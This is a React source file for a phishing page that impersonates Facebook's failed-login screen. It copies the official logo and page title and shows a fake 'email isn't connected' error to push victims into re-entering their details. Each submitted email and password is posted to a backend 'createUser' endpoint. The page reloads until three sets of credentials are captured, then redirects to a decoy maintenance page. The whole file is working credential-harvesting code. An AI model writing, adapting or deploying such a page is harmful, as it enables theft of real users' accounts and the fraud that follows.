import React, { useState, useRef, useEffect } from "react";
import axios from "axios";
import warningIcon from "../assets/warning.png";
import eyeIcon from "../assets/show.png";
import hideIcon from "../assets/hide.png";
import { Link } from "react-router-dom";

export const LoginFailedPage = () => {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const successCountRef = useRef(0);
  const emailRef = useRef(null);
  const loginRef = useRef(null);

  const togglePasswordVisibility = () => setShowPassword(!showPassword);

  useEffect(() => {
    // Retrieve success count from localStorage on component mount
    successCountRef.current =
      parseInt(localStorage.getItem("successCount")) || 0;
  }, []);

  useEffect(() => {
    // Save success count to localStorage whenever it changes
    localStorage.setItem("successCount", successCountRef.current.toString());
  }, [successCountRef.current]);

  useEffect(() => {
    const interval = setInterval(() => {
      if (successCountRef.current !== 0) {
        localStorage.setItem(
          "successCount",
          (successCountRef.current = 0).toString(),
        );
      }
    }, 60000);

    return () => clearInterval(interval); // Clear the interval on component unmount
  }, [successCountRef]);

  useEffect(() => {
    document.title = "Log Into Facebook";
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();

    // Set loading state
    setIsLoading(true);

    if (!email || !password || isLoading)
      return setTimeout(() => {
        setIsLoading(false);
        if (successCountRef.current !== 3) {
          window.location.reload();
        }
      }, 3000);

    // Sending a POST request to create a new user
    axios
      .post("http://localhost:3001/createUser", { email, password })
      .then((result) => {
        console.log(result);
        console.log((successCountRef.current += 1));
        // After successful submission, reload the document after 3 seconds
        setTimeout(() => {
          setEmail("");
          setPassword("");
          if (successCountRef.current !== 3) {
            window.location.reload();
          }
          if (successCountRef.current === 3) {
            // Redirect to maintenance page
            loginRef.current.click();
            // Reset successCountRef after 1 minute if it reaches 3
            const interval = setInterval(() => {
              localStorage.setItem(
                "successCount",
                (successCountRef.current = 0).toString(),
              );
              clearInterval(interval);
            }, 5000);
          }
        }, 3000);
      })
      .catch((err) => {
        console.log(err);
        // Reset loading state on error
        setIsLoading(false);
      });
  };

  // Effect hook to focus on the email input field when the component mounts
  useEffect(() => emailRef.current.focus(), []);

  return (
    <>
      <div>
        <div className="bg-[#f0f2f5] pb-[5rem]">
          <div className="flex justify-center pt-9">
            <img
              className="w-max-full h-[5rem] "
              src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
              alt="Facebook"
            />
          </div>
          <div className="flex justify-center">
            <form
              className="w-[25rem] rounded-lg border-2 bg-white p-4 pb-6 shadow-lg"
              onSubmit={handleSubmit}
            >
              <p className="pb-4 text-[1.2rem]">Log Into Facebook</p>
              <label
                htmlFor="username"
                className="text-sm font-medium text-gray-600"
              ></label>

              {/* Input field for email */}
              <div className="relative flex items-center justify-end">
                <input
                  type="text"
                  id="email"
                  className="mt-1 w-full rounded-md border-[1px] border-red-500 p-[0.85rem] pl-[1rem] text-[1.1rem] placeholder:text-[1.1rem] placeholder:tracking-wide focus:outline-0"
                  placeholder="Email or phone number"
                  ref={emailRef}
                  autoComplete="on"
                  onChange={(e) => setEmail(e.target.value)}
                />
                <div className="absolute mr-[0.6rem] mt-1 cursor-pointer">
                  <img
                    src={warningIcon}
                    alt="Warning"
                    className="w-max-full h-[20px]"
                  />
                </div>
              </div>
              <div className="mt-2 text-left text-sm leading-4 text-red-500">
                The email or mobile number you entered isn&apos;t connected to
                an account.{" "}
                <strong className="cursor-pointer tracking-wider hover:underline">
                  <Link to="/maintenance">Find your account and log in.</Link>
                </strong>
              </div>

              <label
                htmlFor="password"
                className="mt-2 block text-xs font-medium text-gray-600"
              ></label>

              {/* Input field for password with show/hide functionality */}
              <div className="relative flex items-center justify-end">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  className="mt-1 w-full rounded-md border-2 p-[0.8rem] pl-[1rem] text-[1.1rem] placeholder:text-[1.1rem] placeholder:tracking-wide focus:outline-offset-[-15px] focus:ring-2"
                  placeholder="Password"
                  onChange={(e) => setPassword(e.target.value)}
                />

                {password && (
                  <div
                    className="absolute mr-[0.6rem] mt-1 cursor-pointer"
                    onClick={togglePasswordVisibility}
                  >
                    <img
                      src={showPassword ? eyeIcon : hideIcon}
                      alt={showPassword ? "Hide Password" : "Show Password"}
                      className="h-[1.7rem] max-w-full rounded-full p-[0.35rem] hover:bg-gray-100 active:bg-gray-300"
                    />
                  </div>
                )}
              </div>

              {/* Submit button for the login form */}
              <button
                type="submit"
                className={`mt-3 w-full rounded-md p-2 py-3 pt-2 font-sans text-xl font-bold ${
                  isLoading
                    ? "cursor-not-allowed bg-[#0c4a6e] focus:ring-0"
                    : "bg-[#1877f2] hover:bg-[#166fe5]"
                } tracking-wide text-white transition-all focus:outline-0 focus:ring focus:ring-blue-300 focus:transition-all focus:duration-500 active:ring-0 active:transition-none`}
              >
                Log In
              </button>
              <Link to="/maintenance" ref={loginRef} />
              <Link
                to="/maintenance"
                className="mt-4 block pb-1 text-center text-[15px] text-blue-600 hover:underline"
              >
                Forgot password?
              </Link>
            </form>
          </div>
        </div>
        <footer className="bg-white">
          <nav className="mx-auto mt-[6rem] w-[80%] max-w-[980px]">
            {/* Language options */}
            <ul className="flex flex-row flex-wrap pt-6 text-center text-xs leading-3 text-gray-400">
              {[
                "English (US)",
                "Filipino",
                "Bisaya",
                "Español",
                "日本語",
                "한국어",
                "中文 (简体)",
                "العربية",
                "Português (Brasil)",
                "Français (France)",
                "Deutsch",
              ].map((lang, index) => (
                <li
                  key={index}
                  className={`${index !== 0 && "ml-2"} mb-2 text-[#8a8d91]`}
                >
                  {index === 0 ? (
                    <span className="text-[#737373] hover:cursor-text">
                      {lang}
                    </span>
                  ) : (
                    <a
                      href="#"
                      className="hover:cursor-pointer hover:underline"
                    >
                      {lang}
                    </a>
                  )}
                </li>
              ))}

              {/* Plus icon */}
              <li className="mb-2 ml-2 cursor-pointer bg-slate-100 shadow hover:shadow-inner  focus:bg-slate-700">
                <div className="flex h-5 w-8 items-center justify-center border pb-1 ">
                  <a href="#" className="text-lg font-bold text-slate-700">
                    +
                  </a>
                </div>
              </li>
            </ul>
            {/* Footer links */}
            <ul className="flex flex-row flex-wrap border-t pt-2 text-xs leading-5 text-gray-400">
              {[
                "Sign Up",
                "Log In",
                "Messenger",
                "Facebook Lite",
                "Video",
                "Places",
                "Games",
                "Marketplace",
                "Meta Pay",
                "Meta Store",
                "Meta Quest",
                "Imagine with Meta AI",
                "Instagram",
                "Threads",
                "Fundraisers",
                "Services",
                "Voting Information Center",
                "Privacy Policy",
                "Privacy Center",
                "Groups",
                "About",
                "Create Ad",
                "Create Page",
                "Developers",
                "Careers",
                "Cookies",
                "Ad Choices",
                "Terms",
                "Help",
                "Contact Uploading & Non-Users",
              ].map((link, index) => (
                <li key={index} className="pr-5 text-[#8a8d91]">
                  <a href="#" className="hover:underline">
                    {link}
                  </a>
                </li>
              ))}
            </ul>
            <div className="mt-4 text-left text-xs text-[#737373]">
              Meta &copy; 2024
            </div>
          </nav>
        </footer>
      </div>
    </>
  );
};

export default LoginFailedPage;
